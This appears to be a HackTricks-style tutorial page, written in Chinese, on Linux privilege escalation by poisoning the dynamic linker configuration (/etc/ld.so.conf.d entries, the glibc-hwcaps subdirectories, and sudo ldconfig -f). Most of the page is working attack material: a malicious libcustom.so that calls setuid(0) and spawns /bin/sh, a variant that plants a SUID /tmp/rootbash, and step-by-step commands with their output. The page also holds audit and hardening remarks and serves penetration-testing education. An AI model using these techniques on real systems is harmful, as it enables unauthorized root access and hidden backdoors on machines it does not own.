# ld.so 提权 exploit 示例

{{#include ../../banners/hacktricks-training.md}}

本页面是一个专门用于演示如何通过污染 **`/etc/ld.so.conf` 或 `ldconfig` 中的 system linker cache** 的实验环境。有关缺失 library 注入、可写的 `RPATH`/`RUNPATH`、`LD_PRELOAD` 以及其他通用 SUID linker abuse，请参阅 [SUID Shared Library and Linker Abuse](suid-shared-library-and-linker-abuse.md)。

## 准备环境

以下部分包含我们将用于准备环境的文件代码。

{{#tabs}}
{{#tab name="sharedvuln.c"}}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{{#endtab}}

{{#tab name="libcustom.h"}}
```c
#include <stdio.h>

void vuln_func();
```
{{#endtab}}

{{#tab name="libcustom.c"}}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{{#endtab}}
{{#endtabs}}

1. **在你的机器上创建**这些文件，并将它们放在同一文件夹中
2. **编译** **library**：`gcc -shared -o libcustom.so -fPIC libcustom.c`
3. 将 `libcustom.so` **复制**到 `/usr/lib` 并刷新缓存：`sudo cp libcustom.so /usr/lib && sudo ldconfig`（需要 root 权限）
4. **编译** **executable**：`gcc sharedvuln.c -o sharedvuln -lcustom`

### 检查环境

检查 _libcustom.so_ 是否从 _/usr/lib_ **加载**，并确认你可以**执行**该 binary。
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
### 有用的初步分析命令

攻击真实目标时，请确认二进制文件所需的**确切库名称**、loader **当前正在解析的内容**，以及哪些已配置路径可写，同时不要修改正在使用的 cache。<sup>[[1]](#references)[[2]](#references)</sup>
```bash
# Needed SONAME and program interpreter
readelf -d ./sharedvuln | grep NEEDED
interp=$(readelf -l ./sharedvuln | sed -n 's/.*interpreter: \(.*\)]/\1/p')

# Cached candidates and the path selected by the loader
ldconfig -p | grep -F libcustom
"$interp" --list ./sharedvuln 2>/dev/null
LD_DEBUG=libs ./sharedvuln 2>&1 | grep -E 'find library|trying file'

# Configuration, writable config objects, and every component of a configured path
grep -RnsEv '^[[:space:]]*(#|$)' /etc/ld.so.conf /etc/ld.so.conf.d 2>/dev/null
find /etc/ld.so.conf /etc/ld.so.conf.d -writable -ls 2>/dev/null
namei -l /home/ubuntu/lib

# Enumerate what ldconfig would scan without changing links (-X) or the cache (-N)
/sbin/ldconfig -N -X -v 2>/dev/null
```
仅对**trusted**可执行文件使用 `ldd`。某些实现或异常的 ELF interpreter 可能导致其执行 attacker-controlled code；`objdump -p ./file | grep NEEDED` 可以安全地列出直接依赖项。对于 trusted target，使用发现的 interpreter 调用 `--list` 可以显示实际的解析结果。<sup>[[4]](#references)</sup>

一些有用的注意事项：

- `sudo echo ... > /etc/ld.so.conf.d/x.conf` 通常**无法生效**，因为重定向由当前 shell 执行。请改用
`echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf`。
- **SUID/privileged** binaries 在 **secure-execution mode** 下会忽略 `LD_LIBRARY_PATH`/`LD_PRELOAD`，但来自 `/etc/ld.so.conf` 的目录仍属于 trusted loader configuration，因此这种 misconfiguration 仍可能影响 privileged programs。<sup>[[1]](#references)</sup>
- `LD_DEBUG` 在 secure-execution mode 下同样会被忽略，除非存在 `/etc/suid-debug`；因此应从等效的非 SUID 运行中收集其 trace，而不要期待 privileged execution 输出结果。<sup>[[1]](#references)</sup>
- 在较新的 glibc 版本中，dynamic loader 还提供了
`--list-diagnostics`，当 hijack 的行为不符合预期时，它有助于调试 cache resolution 和
`glibc-hwcaps` subdirectory selection。<sup>[[1]](#references)</sup>

### Cache 和 SONAME constraints

`ldconfig` 不会缓存 configured directory 中的每个 arbitrary file：它会检查 ELF headers，识别名称匹配 `lib*.so*` 或 `ld-*.so*` 的文件，并要求遵循常规的 `libfoo.so -> libfoo.so.1 -> libfoo.so.1.12` chain。因此，injected object 必须具有目标 architecture/class、精确的 `DT_NEEDED` name（通常是其 `DT_SONAME`），以及 victim resolves 的所有 symbols/versions。<sup>[[2]](#references)</sup>
```bash
readelf -h /home/ubuntu/lib/libcustom.so | grep -E 'Class:|Machine:'
readelf -d /home/ubuntu/lib/libcustom.so | grep SONAME
readelf -Ws /home/ubuntu/lib/libcustom.so | grep vuln_func
ldconfig -p | grep -F 'libcustom.so'
```
优先使用类似此示例的 target-specific library。使用不完整的 object shadowing 常见 SONAME，可能会破坏每个在预期的 privileged target 运行前解析该 SONAME 的进程。<sup>[[3]](#references)</sup>

## Exploit

在此场景中，我们假设**有人在 _/etc/ld.so.conf/_ 中的某个文件内创建了一个易受攻击的条目**：
```bash
echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf
```
存在漏洞的文件夹是 _/home/ubuntu/lib_（我们拥有可写访问权限）。\
**在该路径中下载并编译**以下代码：
```c
// gcc -shared -fPIC -Wl,-soname,libcustom.so -o libcustom.so libcustom.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(void){
setgid(0);
setuid(0);
puts("I'm the bad library");
system("/bin/sh");
}
```
如果你预计 **root**（或其他特权账户）之后会执行这个存在漏洞的二进制文件，通常最好留下一个 **root-owned artifact**，而不是生成一个交互式 shell。例如：
```c
system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash");
```
然后，在特权执行发生后，你可以使用 `/tmp/rootbash -p`。

现在我们已经在配置错误的路径中**创建了恶意的 libcustom 库**，必须通过一次成功的特权 **`ldconfig`** 运行来重建默认缓存。只有在本地启动过程中确实会调用它的情况下，重启才会有所帮助；否则，请等待管理员执行相关操作，或在存在不安全的 sudo 规则时使用它。<sup>[[2]](#references)</sup>

完成后，**重新检查** `sharedvuln` 可执行文件从哪里加载 `libcustom.so` 库：
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
如你所见，它是从 **`/home/ubuntu/lib`** 加载的；如果任何用户执行它，就会执行一个 shell：
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
> [!TIP]
> 请注意，在此示例中我们尚未提升权限，但通过修改执行的命令，并**等待 root 或其他特权用户执行存在漏洞的二进制文件**，我们将能够提升权限。

### 现代 `glibc-hwcaps` 覆盖

自 glibc 2.33 起，loader 可以优先使用**每个库搜索目录**中 `glibc-hwcaps/<level>/` 下的优化库。因此，仅检查 `/home/ubuntu/lib` 是不够的：可写的兼容子目录，例如 `/home/ubuntu/lib/glibc-hwcaps/x86-64-v3/`，在 `ldconfig` 为其建立索引后即可覆盖基础库，而其他 CPU 仍会使用基础对象。这还提供了一种架构选择性劫持方式：如果验证发生在另一台 CPU 上，可能会漏检该问题。<sup>[[1]](#references)[[3]](#references)</sup>
```bash
# The loader prints the supported levels in priority order
"$interp" --help | sed -n '/Subdirectories of glibc-hwcaps/,$p'
find /home/ubuntu/lib/glibc-hwcaps -type d -writable -ls 2>/dev/null

# Example for a host that reports x86-64-v3 as supported
mkdir -p /home/ubuntu/lib/glibc-hwcaps/x86-64-v3
gcc -shared -fPIC -Wl,-soname,libcustom.so \
-o /home/ubuntu/lib/glibc-hwcaps/x86-64-v3/libcustom.so libcustom.c
sudo ldconfig
ldconfig -p | grep -F libcustom.so
"$interp" --list ./sharedvuln | grep -F libcustom.so
```
当前 glibc hardening 指南建议避免重复的 SONAME、非默认搜索位置，以及 `glibc-hwcaps` 子目录中的对象。从审计角度来看，应递归检查已配置目录及其父路径组件的所有权和可写性。<sup>[[3]](#references)</sup>

### 其他错误配置 - 相同的 vuln

在前面的示例中，我们伪造了一个错误配置：管理员**在 `/etc/ld.so.conf.d/` 中的配置文件内设置了一个非特权文件夹**。\
但如果你对 `/etc/ld.so.conf.d` 中的某个**配置文件**、文件夹 `/etc/ld.so.conf.d` 或文件 `/etc/ld.so.conf` 具有**写权限**，还存在其他可能导致相同 vulnerability 的错误配置；你可以配置并利用相同的 vulnerability。

## Exploit 2

**假设你对 `ldconfig` 具有 sudo 权限**。\
你可以指定 `ldconfig` **从哪里加载 conf 文件**，因此我们可以利用这一点让 `ldconfig` 加载任意文件夹。<sup>[[2]](#references)</sup>\
所以，让我们创建加载 "/tmp" 所需的文件和文件夹：
```bash
cd /tmp
mkdir -p conf
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
现在，如 **previous exploit** 中所示，**在 `/tmp` 内创建恶意库**。\
最后，让我们加载该路径，并检查二进制文件从哪里加载库：
```bash
# -f changes the input configuration; the default output is still /etc/ld.so.cache
sudo ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**正如你所看到的，拥有对 `ldconfig` 的 sudo 权限后，你也可以利用相同的漏洞。** 在评估受限 sudo 规则时，选项的详细行为很重要：`-f` 选择其他配置文件，但仍会重建 `/etc/ld.so.cache`；`-C` 将缓存重定向到其他位置；`-N` 阻止重建缓存；而 `-X` 阻止更新链接，但**仍会重建缓存，除非与 `-N` 结合使用**。<sup>[[2]](#references)</sup>



## References

- [1] [ld.so(8) - Linux 手册页](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [2] [ldconfig(8) - Linux 手册页](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
- [3] [动态链接器加固 - GNU C Library](https://sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Hardening.html)
- [4] [ldd(1) - Linux 手册页](https://man7.org/linux/man-pages/man1/ldd.1.html)
{{#include ../../banners/hacktricks-training.md}}
